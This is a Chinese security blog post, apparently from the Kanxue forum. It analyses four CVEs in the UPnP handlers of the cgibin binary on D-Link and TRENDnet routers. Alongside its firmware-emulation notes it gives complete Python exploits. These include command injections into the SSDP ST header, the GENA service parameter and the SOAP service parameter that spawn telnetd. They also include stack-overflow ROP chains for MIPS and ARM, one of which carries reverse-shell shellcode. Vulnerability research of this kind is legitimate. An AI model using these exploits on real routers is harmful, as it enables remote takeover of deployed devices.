#  cgibin中与upnp协议有关的一些漏洞分析与复现   
原创 winmt  看雪学苑   2022-06-13 18:01  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EXiaaJdNyYhHcc0b2FGBewUFGq9St8EgJlIUURF1GjWlHfIFXB9NoQJoYcPYRxICXvmSHSTPYD6RQ/640?wx_fmt=jpeg "")  
  
本文为看雪论坛精华文章看雪论坛作者ID：winmt  
  
  
  
一  
  
  
**前言**  
###   
### UPNP协议  
  
  
UPNP，全称为：Universal Plug and Play，中文为：通用即插即用，是一套基于TCP/IP、UDP和HTTP的网络协议。  
  
   
  
简单来说，就和它的名字一样，UPNP的目的就是为了在某个设备接入网络后，该网络中的所有设备都知道有新设备加入，这些设备之间能互相沟通，甚至可直接使用或控制对方。  
  
   
  
UPNP的一大亮点就是，只要某设备支持并开启了UPNP，当主机向其发出端口映射请求的时候，该设备就会自动为主机分配端口并进行端口映射。  
  
### cgibin  
  
  
在D-Link，TRENDnet等apache struct的路由器的/htdocs目录下都存在一个cgibin二进制文件，它会有很多.cgi文件的软链接，通过运行这些软链接，其名字会作为第一个参数传入cgibin，就会调用到cgibin中对应的函数。  
  
   
  
cgibin会作为 “请求验证文件” ，对用户的请求进行验证并解析，再将解析后的数据传给对应的文件，进行下一步的操作。  
  
### upnp相关的cgi  
  
  
下图为UPNP协议栈的结构示意图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4dibsWQbfJ4RnDGwpd7fYyr2C7YXJ4PBlm7YYUvVmzleib3OEVzu97iblg/640?wx_fmt=png "")  
  
   
  
可以看到其中的 SSDP（简单服务发现协议），SOAP（简单对象访问协议）与GENA（通用事件通知体系） ，其分别对应ssdpcgi（在/htdocs/upnp目录下），soap.cgi（在/htdocs/upnp/docs/LAN-1目录下），gena.cgi（在/htdocs/upnp/docs/LAN-1目录下），本文也主要是分析这几个cgi在cgibin中对应函数的漏洞。  
  
### FAP (firmware-analysis-plus)  
  
  
由于牵涉到UPNP协议，用qemu来模拟是比较复杂的，需要手动初始化一些东西，因此笔者为了方便，选择使用FAP来仿真模拟固件运行，这个平台基于firmadyne，对其做了一些优化及改进，GitHub的项目地址为：firmware-analysis-plus（  
https://github.com/liyansong2018/firmware-analysis-plus  
）。  
  
   
  
该平台的优点是：可以做到一键仿真模拟固件运行，缺点是：适配性较差，最好在Kali上安装使用，笔者所用的物理机是Kali 2021.11的版本。  
  
   
  
此外，经过笔者测试，该平台对大部分MIPS架构的固件模拟都没有问题，但是对部分ARM架构（特别是D-Link系列高版本路由）的固件模拟好像会出一些问题。  
  
   
  
关于ARM无法成功仿真模拟的问题，笔者已经在github上提交了  
issue  
咨询了作者，并且得到了回复：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4zb1j3J78RDAlzkMhibDDUmTj1lBJM7e9Xg2y3vyoTv2CbutJ0aeldyA/640?wx_fmt=png "")  
  
   
  
笔者后来又找到了另一个优秀的“固件仿真框架”  
EMUX  
，这是一个基于docker的框架，主要针对于arm架构的仿真模拟，近期也支持了mips架构，根据官方的描述，可以对DIR860以上的arm架构路由进行模拟运行。  
  
   
  
2022.5.7更新：  
  
   
  
这篇文章其实是挺久前写的了，昨天刚发出来，今天就收到了FAP项目作者的回复，说是已经修复了D-Link系列高版本arm路由无法仿真的问题：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4yuJDxAdXxu8wyHFMZK0kSyRYEOfhiafZ0iaLfSc57pGTf4ynoNatTNVQ/640?wx_fmt=jpeg "")  
  
   
  
笔者立即测试了一下，的确是修复了该问题，接着，笔者又尝试用FAP模拟运行了TP-Link，Tenda等品牌中多款arm的固件，都能够成功。  
  
   
  
从目前各方面综合来看，FAP项目是仿真模拟IoT固件的极好的选择。  
  
   
  
注：以下复现的CVE所影响的路由器为D-Link DIR-859及以下的版本，以及部分D-Link DIR-859以上的较低小版本，TRENDnet的很多路由器因框架相同，也受其影响。  
  
  
  
二  
  
  
**CVE-2020-15893**  
  
  
漏洞信息：CVE-2020-15893（  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15893  
）  
  
   
  
这个CVE与ssdpcgi有关，我们先来分析cgibin中的ssdpcgi_main函数，可以很轻松地定位到可能的漏洞点在LABEL_17这里：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4micldUFtkdNbT9qE7fmYuFNzB86HApTeDvD3oUEymTnO5nBwTgQJlIA/640?wx_fmt=png "")  
  
   
  
进入lxmldbc_system函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4xldqNMgdbUiaJtHRSuLejnqBWnW7e4l9ODxz5OwTtniatZkCw3iaL4Xtg/640?wx_fmt=png "")  
  
   
  
可以看到这里是用vsnprintf对传进来的格式化字符串进行了拼接，其中va是通过va_arg取当前栈上的元素组成的va_list，通过动态调试不难发现，这里取的栈上的元素就是存放在栈上的环境变量：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4O1EoSAjtDXb5cGBnRBtcBvvLCKqH1iakTaBFfzh7v4fQEZViasyDtd6A/640?wx_fmt=png "")  
  
   
  
在真机环境中，这里只有HTTP_ST是我们可控的。  
  
   
  
当我们向HTTP_ST注入恶意指令，那么拼接好的字符串v6作为system参数，就可以导致任意命令执行（RCE）漏洞了。  
  
   
  
再回到ssdpcgi_main详细分析一下该如何构造payload：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4FiaENbHSsdfgqFunib7CCyB1H6TwsGI8KicFA48kIZB0BfPa5zQFC84IQ/640?wx_fmt=png "")  
  
   
  
可以发现，进行一堆匹配验证，最后的格式化字符串只有下面两个会多出一个参数%s的拼接，我们再看到汇编：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4micEjNBzwep9PLk4vqNWPWsLbWvYSxGXaib95dB6ojDSIVV464rNJENw/640?wx_fmt=png "")  
  
   
  
这里的第二个参数为/etc/scripts/upnp/M-SEARCH.sh，第三四个参数可以往上查找到，分别是REMOTE_ADDR和REMOTE_PORT：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4azJKwaiafr24A3SuI54LZK4VmKVpSt0RvhNax2icGibMXX7PAIEJfyqjg/640?wx_fmt=png "")  
  
   
  
结合格式化字符串，可以猜测并通过动调验证出，最后在lxmldbc_system函数中拼接好的system的参数应为 /etc/scripts/upnp/M-SEARCH.sh XXX REMOTE_ADDR:REMOTE_PORT SERVER_ID HTTP_ST & ，因此，想要造成RCE，也就是要让HTTP_ST拼接上去，就必须要选用后面两个格式化字符串（device和service），也就需要之前有urn:才行。  
  
   
  
综上，我们初步构造的payload可以是向HTTP_ST注入urn:device:;telnetd -p 8888，由于此busybox自带了telnetd，这里用telnetd开一个端口，再从主机远程登陆进去是最方便的。  
  
   
  
我们知道ssdpcgi和UPNP协议有关，也就是要发送报文到UPNP相关的端口，所以先用FAP模拟运行起固件，然后打开/var/run/httpd.conf文件，可以找到：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4yBibCBTh6bVW7ouasXvFkDXvOLvP7bB0iaibiagqLex8fwohXSahIPPqUA/640?wx_fmt=png "")  
  
   
  
也就是说，要向1900端口发送报文，才能走到ssdpcgi。  
  
   
  
然而，发送一段报文，肯定是需要请求方式的，在cgibin中不好直接看出来，可以到/usr/sbin/upnp文件中去找ST字段的关键词定位：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4wtRf3diaBxiaFXpwbjC5MicpH60BI1Un6rg92W8CTfw1ibW8mkKKykibkzA/640?wx_fmt=png "")  
  
   
  
可以看到sub_41BFDC函数中有对其的操作，再交叉引用到调用sub_41BFDC的sub_41C2A0函数，这里要求我们的请求方式是M-SEARCH：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4tfxoylAZXHyeSsP0p3ExdlPE5z8BjuicCSyHibRdXG4egR8tKcN3iboGw/640?wx_fmt=png "")  
  
   
  
上图中的v10是调用ILibParsePacketHeader对a1 + 108的数据包解析的结果，而a1 + 108是接收到的socket套接字储存的地方：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4b1L3RYib7Gpe7gurJZuMRalmr9V6SUJ3icu9aKhTNbhWZcU0496NOjzg/640?wx_fmt=png "")  
  
   
  
在sub_415C9C中也可以看到，把socket绑定到了1900端口：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4DOJiaZpW3FCnncCM0Htc1r16u9zqb3Bpr8GzPASLYeRibzM9ib23ooo5w/640?wx_fmt=png "")  
  
   
  
再回到有对ST字段进行匹配操作的sub_41BFDC函数，可以看到首先需要绕过下面圈出的判断，这里的1.1显然就是HTTP版本：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4NWKk7ia77V5USiaAHFYILVxm5egHzauOa6fmqWP9VNtYGsicAwTvhRCsg/640?wx_fmt=png "")  
  
   
  
综上，从upnp二进制文件中可以看到，我们得是M-SEARCH请求方式，故：报文头应为M-SEARCH * HTTP/1.1。  
  
   
  
**POC：**  
```
# python3
from socket import *
from os import *
from time import *
 
payload = b'M-SEARCH * HTTP/1.1\r\n'
payload += b'HOST:localhost:1900\r\n'
payload += b'ST:urn:device:;telnetd -p 8888\r\n\r\n'
 
s = socket(AF_INET, SOCK_DGRAM, 0)
s.sendto(payload, ("192.168.10.1", 1900))
s.close()
 
sleep(1)
system("telnet 192.168.10.1 8888")
```  
  
  
最终成功开启了8888端口，利用telnet远程登陆到了路由器固件中，可执行任意命令：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4J81muz0uFV009WIUAtrNmG8MxssupibBwVjlZHwXxjeCRxwdBHzgyvg/640?wx_fmt=png "")  
  
   
  
通过ps命令查看进程，可以发现telnetd -p 8888命令的确已经被成功执行：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4W0mHyiaLtic9PxnP8MicicrhXDwtkUk1Xhl7ibUtB85g9bouezZCu4VLHXA/640?wx_fmt=png "")  
##   
##   
  
三  
  
  
**CVE-2019-17621**  
  
  
漏洞信息：CVE-2019-17621（  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621  
）  
  
   
  
这个漏洞与gena.cgi有关，还是先看到cgibin中的genacgi_main函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4a0cRKPXsKYhbz2ic5NAvqgnnrWIgsMEs5drwxluN3gkcVp5aFXIKIJA/640?wx_fmt=png "")  
  
   
  
可以看到v5是service=后面的内容，再先看到SUBCRIBE请求方式对应的sub_41A390函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4guibyzFHBo0ibI6q2xXDCj7r6618uZFnrJF1iaNCiazLhg396KDBPyKpTg/640?wx_fmt=png "")  
  
   
  
看到这里，拼接好的字符串v16作为了xmldbc_ephp的参数，xmldbc_ephp函数在这里显然就是运行了/htdocs/upnp/run.NOTIFY.php文件，于是，我们再来分析这个文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4kQskoKicVbABhLnjOaibPdwV57icJj2juKmNqIkgIosTwpfQANDh0ltgg/640?wx_fmt=png "")  
  
   
  
当SID为空的时候，调用了GENA_subscribe_new函数，这个函数在/htdocs/upnpinc/gena.php中：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4c6GD2ngBQhnS4h8NmctdlX7JuyCzibiaaDZsvYIZA2RP19AMndlYuwEg/640?wx_fmt=png "")  
  
   
  
这里有对HOST的检查，然后最后调用到了GENA_notify_init函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H47vjCYGRFWz4VgTxtmYBxWSjPLEic5cT7IE1g2UyKYPvoCRyKNlHR8bA/640?wx_fmt=png "")  
  
   
  
在最后，将$shell_file写入了shell文件中，不难想到，可以通过控制shell_file达成任意命令执行。  
  
   
  
再看回到sub_41A390函数中，既然HTTP_SID必须为空才能走到漏洞点，那么自然就走到了else分支：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H42J20nTPXEibLGH6nXjmqVRriciaqw6YfELFicLpF9jMAtu4dnN9QU9uicaQ/640?wx_fmt=png "")  
  
   
  
这些检查都需要绕过，才能走到xmldbc_ephp函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4A6azj8aYDvfDL4tVsDISWeicPIjoxbePNRe0lOFea4RtUDglrLicq8IQ/640?wx_fmt=png "")  
  
   
  
这里的SHELL_FILE中可控参数a1就是从genacgi_main传进来的参数v5，也就是service=后面的内容。  
  
   
  
综上，可以通过对service注入恶意指令，造成RCE漏洞 。  
  
   
  
至此，我们知道了报文的请求方式得是SUBSCRIBE才能触发漏洞，至于UNSUBSCRIBE和SID不为空的情况可以自行审一遍代码，很容易看出是行不通的。  
  
   
  
接下来要做的就是找的对应的UPNP端口，先找gena.cgi在哪里，看到/etc/services/HTTP/httpsvcs.php文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H43jAuOWdedAdEoP5ljDx3saaPFfreq7uyytBByaJzQwRtxz9dArIsWQ/640?wx_fmt=png "")  
  
   
  
这里将cgibin的软链接建到了/var/htdocs/upnp/目录下，而这个目录也有软链接，为/htdocs/upnp/docs：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H439ZvTia7ia0eS5yDdjuyHiaL2Fwn2BItoO6JJAsJEAH3wD6LJlEURibQMw/640?wx_fmt=png "")  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H40f1ggXpn7DLJD1icNkw5SbRAHmaqHyz2fMjY6uUdK1JrupTMA8JjJxg/640?wx_fmt=png "")  
  
   
  
得到了这些信息，再看到/var/run/httpd.conf文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4GMwrFZMG3ib9EQ1azNYsdL8eGqKBOIWEPW2ekeYkEQqjq0b5zVwF0ZQ/640?wx_fmt=png "")  
  
   
  
可以看到，需要向49152端口发送报文。  
  
   
  
**POC：**  
```
from pwn import *
from socket import *
from os import *
from time import *
 
request = b"SUBSCRIBE /gena.cgi?service=" + b"`telnetd -p 7777`" + b" HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Callback: http:///\r\n"
request += b"NT: upnp:event\r\n"
request += b"Timeout: Second-2333\r\n\r\n"
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((gethostbyname("192.168.0.1"), 49152))
s.send(request)
 
#io = remote("192.168.0.1", 49152)
#io.send(request)
 
sleep(1)
os.system('telnet 192.168.0.1 7777')
```  
  
  
这里拿socket或pwntools来打都是OK的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4BVeoo47r8ic1ApY7BaU0zNWs5EMCKExJc0KqAFakbV0RD3XrUBsMoww/640?wx_fmt=png "")  
  
   
  
或者直接nc上49152端口手动发送报文：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H47EpS2SH3DfyU9TOn98YicSSK9KQvrWzVZNhrEtfUDGZ5viaL525EXwCw/640?wx_fmt=png "")  
##   
##   
  
四  
  
  
**CVE-2018-6530**  
  
  
漏洞信息：CVE-2018-6530（  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6530  
）  
  
   
  
这个漏洞是在soap.cgi中的，还是看到cgibin中的soapcgi_main函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4YWhUZpjVUI66jE784saXXicus4ltw6NdPSlcYebibI4byq0KibyMzFalw/640?wx_fmt=png "")  
  
   
  
首先需要绕过一些检查，比如CONTENT_TYPE得是text/xml，REQUEST_METHOD得是POST，HTTP_SOAPACTION中得有#等，可以看到这里对service后的内容已经进行了一些过滤，但是 貌似忘记过滤了&符号 。  
  
   
  
接着往下看：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H48jn0fDflq88KicR16E4sQKra20Kp17D12WAJuaIrgD8XoyxZP3gA1qA/640?wx_fmt=png "")  
  
   
  
这里的cgibin_parse_request已经很熟悉了，就是对POST内容的解析，在这里用处不大，就注意设置一下相关环境变量即可。  
  
   
  
再下面就来到漏洞点了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H44U2mdmL4q5ictBjG9VGWEdEUAPfYU11OW3xMjhicsZPeWkjkdqFIgGhA/640?wx_fmt=png "")  
  
   
  
这个fopen的第二个参数是a+，文件不存在就会创建，所以这个if很好判断过，下面的sprintf + system很显然存在一个任意命令执行的RCE漏洞。  
  
   
  
之前说过，&忘记过滤了，因此我们可以用&&连接恶意命令并注入到service中，由于之前的sh /var/run/是个合法路径，因此算执行成功，可以走到&&之后的恶意命令。  
  
   
  
在上一个CVE中已经分析过了，soap.cgi也是通过49152端口发送报文给UPNP的 。  
  
   
  
**POC：**  
```
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((gethostbyname("192.168.0.1"), 49152))
s.send(request)
 
sleep(1)
system('telnet 192.168.0.1 8888')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4U8vMYL7l8aaicKxibliadS87LOmicR82u1EWia5GJFcvbnkPOicpVpU5gZ5w/640?wx_fmt=png "")  
##   
##   
  
五  
  
  
**CVE-2022-25106**  
  
  
漏洞信息：CVE-2022-25106（  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25106  
）  
  
   
  
这个漏洞仍然是在gena.cgi中，不过这次是存在缓冲区溢出的漏洞：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4NFDYG4icuT11OvZtzQdQDGnRNldTuCiclu2G9kNTIbaibg8piaticiavN0Cg/640?wx_fmt=png "")  
  
   
  
上图是当为UNSUBSCRIBE请求方式时走到的函数，很容易看出存在一处栈溢出的漏洞，且当请求方式为SUBSCRIBE时，也存在同样的栈溢出漏洞。  
  
   
  
需要提一下的就是，这里的SERVER_ID环境变量可以从httpd.conf文件中看到：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4Gz9WleicnI2nLwWTUG0AAOgb0ibEEhrE7SQXLhibJtt9FIibeNSsqRJr4Q/640?wx_fmt=png "")  
  
   
  
这个环境变量本身就不为空，也不是我们可控的，在这个栈溢出漏洞中，我们可以对service或HTTP_SID进行payload的注入，进行漏洞利用或造成拒绝服务。  
  
   
  
这里需要注意的是：用FAP启动好固件后，需要用echo 0 > /proc/sys/kernel/randomize_va_space命令关闭地址随机化（ASLR），因为在真机环境中就是没开ASLR的，也方便我们接下来的复现：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4HicBARPvic379FWsk6YL5oOCVAYSsRciaPTJLwHzK2xUpqTDh2KzAooJw/640?wx_fmt=png "")  
  
   
  
**POC-1：**  
  
   
  
用UNSUBSCRIBE的请求方式，对service进行了注入。  
```
# python3
from pwn import *
from socket import *
from os import *
from time import *
context(os = 'linux', arch = 'mips')
 
libc_base = 0x2aaf8000
 
s = socket(AF_INET, SOCK_STREAM)
 
cmd = b'telnetd -l /bin/sh;'
payload = b'a'*462
payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1
payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)
payload += b'a'*4 # fp
payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)
payload += b'a'*0x18 # padding
payload += cmd
 
msg = b"UNSUBSCRIBE /gena.cgi?service=" + payload + b" HTTP/1.1\r\n"
msg += b"Host: localhost:49152\r\n"
msg += b"SID: 1\r\n\r\n"
 
s.connect((gethostbyname("192.168.10.1"), 49152))
s.send(msg)
 
sleep(1)
system("telnet 192.168.10.1 23")
```  
  
  
成功地远程登陆到了路由固件中：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4pGicG8dEfvlGBm3aMdpRTzuXjUDMZIyxgtH0Djj416CoUHtoJBPdXfA/640?wx_fmt=png "")  
  
  
检测到23号端口的telnet服务已被开启：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4kyql5iaiajESZtMicRL7bhByJgNL0voRj3UEhTooiaWDia5tqt6X0AicgC6w/640?wx_fmt=png "")  
  
   
  
**POC-2：**  
  
   
  
这个脚本在firmadyne模拟的环境中是打不通的，原因未知，可能是shellcode过长，到了一些不可执行区，但是在真机环境是可以打通的。  
  
   
  
这里用的是SUBSCRIBE的请求方式，对service进行了注入。  
```
# python3
from pwn import *
from socket import *
from os import *
from time import *
context(os = 'linux', arch = 'mips')
 
libc_base = 0x2aaf8000
 
s = socket(AF_INET, SOCK_STREAM)
 
payload = b'a'*449
payload += b'a'*4 # s0
payload += p32(libc_base + 0x3E874) # s1  move $t9, $s2 (=> lw... => jr $t9)
payload += p32(libc_base + 0x56BD0) # s2  sleep
payload += b'a'*(4*5)
payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)
 
payload += b'a'*0x18
payload += b'a'*4 # s0
payload += p32(libc_base + 0x37E6C) # s1  move  $t9, $a1 (=> jr $t9)
payload += b'a'*4 # s2
payload += p32(libc_base + 0xB814) # ra  addiu $a1, $sp, 0x18 (=> jalr $s1)
 
shellcode = asm('''
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424
 
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    not $a1, $t4
    slti $a2, $zero, 0xFFFF
    li $v0, 4183
    syscall 0x42424
 
    andi $a0, $v0, 0xFFFF
    li $v0, 4041
    syscall 0x42424
    li $v0, 4041
    syscall 0x42424
 
    lui $a1, 0xB821 # Port: 8888
    ori $a1, 0xFF01
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)
 
    li $a1, 0x68FAA8C0 # IP: 192.168.250.104
    sw $a1, -4($sp)
    addi $a1, $sp, -8
 
    li $t4, 0xFFFFFFEF
    not $a2, $t4
    li $v0, 4170
    syscall 0x42424
 
    lui $t0, 0x6962
    ori $t0, $t0,0x2f2f
    sw $t0, -20($sp)
 
    lui $t0, 0x6873
    ori $t0, 0x2f6e
    sw $t0, -16($sp)
 
    slti $a3, $zero, 0xFFFF
    sw $a3, -12($sp)
    sw $a3, -4($sp)
 
    addi $a0, $sp, -20
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
 
    addiu $sp, $sp, -20
 
    slti $a2, $zero, 0xFFFF
    li $v0, 4011
    syscall 0x42424
''')
payload += b'a'*0x18
payload += shellcode
 
msg = b"SUBSCRIBE /gena.cgi?service=" + payload + b" HTTP/1.1\r\n"
msg += b"Host: localhost:49152\r\n"
msg += b"SID: 1\r\n"
msg += b"Timeout: Second-2333\r\n\r\n"
 
s.connect((gethostbyname("192.168.250.1"), 49152))
s.send(msg)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4DW6yOeibKicyPOIrcLO6HIjqWdmHib7MkLIGJjwib7xkzicZwHQvstBEd6A/640?wx_fmt=png "")  
  
   
  
**POC-3：**  
  
   
  
发现DIR-860L v2.03竟然还存在这个漏洞，于是也打了一下，这里注入的是HTTP_SID，又由于uClibc版本换了，所以gadget也有些变化：  
```
# python3
from pwn import *
from socket import *
from os import *
from time import *
context(os = 'linux', arch = 'mips')
 
libc_base = 0x2aabf000
 
s = socket(AF_INET, SOCK_STREAM)
 
cmd = b'telnetd -p 8888;'
payload = b'a'*437
payload += b'a'*4 # s0
payload += p32(libc_base + 0x398A4) # s1  move $a0, $s4 ... jalr $fp
payload += p32(libc_base + 0x56C20) # fp  system
payload += p32(libc_base + 0x3B2B0) # ra  addiu $s4, $sp, 0x28 ... jalr $s1
payload += b'a'*0x28 # padding
payload += cmd
 
msg = b"UNSUBSCRIBE /gena.cgi?service=0 HTTP/1.1\r\n"
msg += b"Host: localhost:49152\r\n"
msg += b"SID: " + payload + b"\r\n\r\n"
 
s.connect((gethostbyname("192.168.0.1"), 49152))
s.send(msg)
 
sleep(1)
system("telnet 192.168.0.1 8888")
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4NdoCBSibR7BEHicc572DpCBxb9HepEk8xyuxp9lKaMhH9t5b8RgdWp2w/640?wx_fmt=png "")  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4OkupKfgyicYqjxYqjMlg2X2Ur7FTLnmWxgGVT347Q5U9ia0yM1pPWykA/640?wx_fmt=png "")  
  
   
  
**POC-4：**  
  
   
  
发现DIR-880L v1.0虽然架构换成了armel，但是这个漏洞仍然是存在的。  
  
   
  
不过，FAP对部分arm架构的固件的仿真运行有些问题，笔者也还不太会用EMUX，没成功启动固件，目前又没有真机的测试条件，就先贴一下POC（这里的gadget在本地的qemu测试过，是可以跑通的）：  
  
   
  
2022.5.7更新：FAP项目作者已经修复了D-LINK系列高版本arm路由无法仿真模拟的问题，下面给出的是最终测试通过的POC。  
```
# python3
from pwn import *
from socket import *
from os import *
from time import *
context(os = 'linux', arch = 'arm')
 
libc_base = 0xb6f7e000
 
s = socket(AF_INET, SOCK_STREAM)
 
cmd = b'telnetd -l /bin/sh;'
payload = b'a'*462
payload += b'a'*4 # r4
payload += b'a'*4 # r5
payload += b'a'*4 # r11
payload += p32(libc_base + 0x169a0) # pop {r2, r3, r4, pc};
payload += b'a'*4
payload += p32(libc_base + 0x406f8) # mov r0, r1; pop {r3, pc};
payload += b'a'*4
payload += p32(libc_base + 0x390fc) # pc add r1, sp, #0x2c; blx r3;
payload += b'a'*4 # r3
payload += p32(libc_base + 0x5a270) # pc system
payload += b'a'*(0x2c-8) # padding
payload += cmd
 
msg = b"UNSUBSCRIBE /gena.cgi?service=" + payload + b" HTTP/1.1\r\n"
msg += b"Host: localhost:49152\r\n"
msg += b"SID: 1\r\n\r\n"
 
s.connect((gethostbyname("192.168.0.1"), 49152))
s.send(msg)
 
sleep(1)
system("telnet 192.168.0.1 23")
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4QkWqGyH4D7P9u4icV0NxicaiaQZbx2sRZ2J4dWvhnD5fSUr2oLDciahztA/640?wx_fmt=jpeg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4ueKdCdQJKmuTU69nnUnUSn7HiaYu63pBNOWxxW1ialSsLRoL8Y21dBoA/640?wx_fmt=png "")  
  
  
**看雪ID：winmt**  
  
https://bbs.pediy.com/user-home-949925.htm  
  
*本文由看雪论坛 winmt 原创，转载请注明来自看雪社区  
  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458447393&idx=5&sn=6d82ff01f82a6dda33188cdc22938983&chksm=b18fdeab86f857bd3804504bd2add426b5a0a678624e2f06f04d2e5b4d7df7216e5831e5e8cd&scene=21#wechat_redirect)  
  
  
  
**#****往期推荐**  
  
